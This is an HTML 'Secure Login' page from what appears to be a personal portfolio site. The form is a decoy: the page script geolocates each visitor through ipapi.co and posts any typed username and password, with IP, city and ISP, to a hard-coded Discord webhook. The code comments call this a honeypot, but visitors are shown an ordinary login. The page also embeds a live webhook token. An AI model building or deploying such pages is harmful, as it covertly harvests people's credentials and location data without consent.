<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - Jan Kirschke</title>
    
    <link rel="stylesheet" href="../style.css">

    <style>
        /* == Ladesymbol (Loader) == */
        #loader-wrapper {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background-color: #111;
            z-index: 9999;
            display: flex; justify-content: center; align-items: center;
        }
        .loader {
            border: 8px solid #f3f3f3;
            border-top: 8px solid #3498db;
            border-radius: 50%;
            width: 60px; height: 60px;
            animation: spin 1.5s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* == Login-Formular Styles (wie gehabt) == */
        .login-container {
            max-width: 400px;
            margin: 5rem auto;
            padding: 2rem;
            border: 1px solid #444;
            border-radius: 8px;
            background-color: rgba(20, 20, 30, 0.5);
        }
        .login-container h2 { text-align: center; margin-bottom: 1.5rem; }
        .login-container form div { margin-bottom: 1rem; }
        .login-container label { display: block; margin-bottom: 0.5rem; font-size: 0.9rem; color: #ccc; }
        .login-container input[type="text"], .login-container input[type="password"] {
            width: 100%; padding: 0.75rem; background-color: #222;
            border: 1px solid #555; border-radius: 4px; color: #fff; box-sizing: border-box;
        }
        .login-container .btn-outline {
            width: 100%; padding: 0.75rem; margin-top: 1rem; cursor: pointer;
            background: transparent; border: 1px solid #3498db; color: #3498db;
        }
        .login-container .btn-outline:hover {
            background: #3498db; color: #fff;
        }
        #ip-info {
            text-align: center; margin-top: 1.5rem; font-size: 0.8rem; color: #888; font-family: monospace;
        }
    </style>
</head>
<body>
    <div id="loader-wrapper">
        <div class="loader"></div>
    </div>

    <div class="stars"></div>
    
    <header>
        <div class="logo">
             <div class="logo-icon"><img src="../images/jan-kirschke-ascii.png" alt="Jan Kirschke Logo"></div>
            <span class="logo-text">Jan Kirschke</span>
        </div>
        <nav>
            <a href="../index.html">Home</a>
            <a href="code_n_caffee.html">Code & Caffee</a>
            <a href="projects.html">Projects</a>
            <a href="contact.html">Contact Me</a>
        </nav>
        <div class="auth-buttons">
            <a href="login.html" class="btn-outline">Login</a>
        </div>
    </header>

    <main class="main-index"> 
        <div class="login-container">
            <h2>Secure Login</h2>
            <form id="login-form">
                <div>
                    <label for="username">Username</label>
                    <input type="text" id="username" name="username" required>
                </div>
                <div>
                    <label for="password">Password</label>
                    <input type="password" id="password" name="password" required>
                </div>
                <button type="submit" class="btn-outline">Login</button>
            </form>
            
            <p id="ip-info">Checking connection...</p>
        </div>
    </main>

    <footer>
        <a href="impressum.html">Impressum</a>
        <a href="https://github.com/Jan-Kirschke" target="_blank">Github</a>
        <a href="https://www.linkedin.com/in/jan-kirschke" target="_blank">LinkedIn</a>
        <a href="https://www.kaggle.com/jankirschke42" target="_blank">Kaggle</a>
    </footer>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            
            const loader = document.getElementById('loader-wrapper');
            const ipInfoElement = document.getElementById('ip-info');
            const loginForm = document.getElementById('login-form');
            

            const WEBHOOK_URL = "https://discord.com/api/webhooks/1445876618458300558/b2T4ZyYWCNCXIEZApJltktwbAmmgE1asljZ5LJqUH1nApZ0Y3z_2e7nDxkZqHqK9JPA1";

            // Wir speichern hier alle Infos √ºber den Nutzer
            let userInfo = {
                ip: 'Unbekannt',
                city: 'Unbekannt',
                country: 'Unbekannt',
                org: 'Unbekannt' // Der Internetanbieter
            };

            // 1. IP UND Standort abrufen (Wir nutzen jetzt ipapi.co statt ipify)
            fetch('https://ipapi.co/json/')
                .then(response => {
                    if (!response.ok) throw new Error('Netzwerkfehler');
                    return response.json();
                })
                .then(data => {
                    // Daten speichern
                    userInfo.ip = data.ip;
                    userInfo.city = data.city;
                    userInfo.country = data.country_name;
                    userInfo.org = data.org;

                    // Anzeige im Frontend aktualisieren
                    ipInfoElement.textContent = `Connected from: ${data.city}, ${data.country_name} (${data.ip})`;
                })
                .catch(error => {
                    console.error('Geo-Location Fehler:', error);
                    ipInfoElement.textContent = 'Connection verify failed (Location unknown).';
                })
                .finally(() => {
                    loader.style.display = 'none';
                });

            // 2. Login abfangen und an Discord senden
            loginForm.addEventListener('submit', function(event) {
                event.preventDefault(); 

                const username = document.getElementById('username').value;
                const password = document.getElementById('password').value;

                // Nachricht f√ºr Discord vorbereiten
                const payload = {
                    username: "Honeypot W√§chter",
                    avatar_url: "https://i.imgur.com/4M34hi2.png",
                    embeds: [
                        {
                            title: "üö® Zugriff erkannt!",
                            description: "Jemand hat versucht sich einzuloggen.",
                            color: 15158332, // Ein warnendes Rot
                            fields: [
                                {
                                    name: "üë§ User Input",
                                    value: `**User:** \`${username}\`\n**Pass:** \`${password}\``,
                                    inline: false
                                },
                                {
                                    name: "üåç Standort (Gesch√§tzt)",
                                    value: `${userInfo.city}, ${userInfo.country}`,
                                    inline: true
                                },
                                {
                                    name: "üì° Netzwerk / IP",
                                    value: `${userInfo.ip}\n(${userInfo.org})`,
                                    inline: true
                                }
                            ],
                            footer: {
                                text: "Jan Kirschke Security System"
                            },
                            timestamp: new Date().toISOString()
                        }
                    ]
                };

                // Senden an Discord
                fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                })
                .then(response => {
                    if (response.ok) {
                        
                        // Pr√ºfen, ob wir eine Stadt haben (also nicht "Unbekannt")
                        if (userInfo.city !== 'Unbekannt') {
                            alert(`Gr√º√üe nach ${userInfo.city} in ${userInfo.country} :D`);
                        } else {
                            // Fallback, wenn der Ort nicht ermittelt werden konnte
                            alert("Login fehlgeschlagen. Deine IP wurde protokolliert.");
                        }

                        loginForm.reset();
                    }
                })
            });
        });
    </script>
</body>
</html>
